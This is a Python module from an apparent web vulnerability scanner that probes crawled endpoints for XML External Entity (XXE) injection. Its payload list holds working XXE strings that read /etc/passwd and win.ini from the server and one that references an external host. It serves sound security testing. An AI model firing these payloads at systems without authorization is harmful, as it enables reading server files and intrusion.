"""
XML External Entity (XXE) Injection Detection Module
OWASP A05:2021 – Security Misconfiguration / A03 Injection
"""

import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse

import requests

logger = logging.getLogger(__name__)


class XXEDetector:
    """
    Detects XXE by submitting crafted XML payloads to endpoints that
    accept XML content (application/xml, text/xml).
    """

    XXE_PAYLOADS = [
        # Classic file read
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root>&xxe;</root>',
            ["root:x:", "bin:x:", "daemon:x:"],
        ),
        # Windows file read
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<root>&xxe;</root>',
            ["[fonts]", "[extensions]", "[mail]"],
        ),
        # OOB via error (blind XXE indicator — non-resolving URI causes parse error)
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe-test.invalid/">]>'
            '<root>&xxe;</root>',
            [],  # any connection attempt = SSRF-like behaviour; we flag the attempt
        ),
    ]

    ACCEPT_XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/xhtml+xml",
        "application/soap+xml",
        "application/rss+xml",
        "application/atom+xml",
    ]

    def __init__(self, session: requests.Session, config: Dict):
        self.session = session
        self.config = config

    def test_endpoint(self, url: str) -> Optional[Dict]:
        """
        Try XXE payloads against an endpoint that appears to accept XML.
        Returns finding dict or None.
        """
        # First probe the endpoint to check if it processes XML
        if not self._accepts_xml(url):
            return None

        for payload, indicators in self.XXE_PAYLOADS:
            try:
                resp = self.session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=self.config.get("request_timeout", 15),
                )
                if indicators:
                    for indicator in indicators:
                        if indicator.lower() in resp.text.lower():
                            logger.warning(f"XXE confirmed at {url}")
                            return {
                                "payload": payload[:120] + "...",
                                "indicator": indicator,
                            }
            except Exception as exc:
                logger.debug(f"XXE test error: {exc}")

        return None

    def scan_crawled_urls(self, urls: List[str]) -> List[Dict]:
        """
        Scan a list of discovered URLs for XXE exposure.
        Returns vulnerability records ready for the scanner engine.
        """
        findings = []
        for url in urls:
            result = self.test_endpoint(url)
            if result:
                findings.append({
                    "type": "XML External Entity (XXE)",
                    "url": url,
                    "severity": "Critical",
                    "description": (
                        "The endpoint processes XML input and is vulnerable to XXE injection. "
                        "An attacker can read arbitrary server files or trigger server-side "
                        "request forgery via external entity references."
                    ),
                    "details": result,
                })
        return findings

    # ------------------------------------------------------------------
    def _accepts_xml(self, url: str) -> bool:
        """Return True if the endpoint appears to accept XML payloads."""
        try:
            resp = self.session.options(
                url,
                timeout=self.config.get("request_timeout", 15),
            )
            allow = resp.headers.get("Allow", "")
            content_type = resp.headers.get("Content-Type", "")
            if "POST" in allow:
                return True
            if any(ct in content_type for ct in self.ACCEPT_XML_CONTENT_TYPES):
                return True
        except Exception:
            pass

        # Heuristic: if URL path ends in xml-like segment, try anyway
        path = urlparse(url).path.lower()
        return any(seg in path for seg in ["/xml", "/soap", "/api", "/rss", "/atom", "/feed"])
